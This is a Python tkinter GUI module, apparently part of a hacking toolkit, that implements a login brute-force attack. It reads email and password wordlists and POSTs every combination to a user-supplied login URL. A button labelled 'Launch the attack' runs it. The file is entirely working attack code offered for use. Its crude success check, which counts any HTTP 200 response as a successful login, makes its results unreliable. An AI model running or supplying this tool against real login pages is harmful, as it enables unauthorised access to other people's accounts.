from tkinter import Frame, Label, Entry, Button, Text

import os
import requests


class Bruteforce(Frame):

    def __init__(self, parent, controller):

        Frame.__init__(self, parent)
        self.controller = controller

        Label(self, text="Login URL:").pack()
        self.login_url_entry = Entry(self)
        self.login_url_entry.pack()

        Label(self, text="Email field name:").pack()
        self.email_field_name_entry = Entry(self)
        self.email_field_name_entry.pack()

        Label(self, text="Password field name:").pack()
        self.password_field_name_entry = Entry(self)
        self.password_field_name_entry.pack()

        self.result_text = Text(self)
        self.result_text.pack()

        Button(self, text="Launch the attack", command=self.launch_attack).pack()

    def launch_attack(self):

        email_field = self.email_field_name_entry.get()
        password_field = self.password_field_name_entry.get()

        directory_path = os.path.dirname(os.path.realpath(__file__))

        emails_path = os.path.join(directory_path, '../Resources/Bruteforce/emails.txt')
        passwords_path = os.path.join(directory_path, '../Resources/Bruteforce/password.txt')

        with open(emails_path, 'r') as f:
            emails = [line.strip() for line in f]

        with open(passwords_path, 'r') as f:
            passwords = [line.strip() for line in f]

        self.result_text.delete('1.0', 'end')

        success_counter = 0
        fail_counter = 0

        for email in emails:
            for password in passwords:
                data = {
                    email_field: email,
                    password_field: password
                }
                response = requests.post(self.login_url_entry.get(), data=data)
                if response.status_code == 200:
                    message = "Success"
                    success_counter += 1
                else:
                    message = "Failed"
                    fail_counter += 1

                self.result_text.insert('end', f"{message} with username: {email}, password: {password}\n")

        self.result_text.insert('end', f"\nSummary:\nSuccesses: {success_counter}\nFailures: {fail_counter}\n")
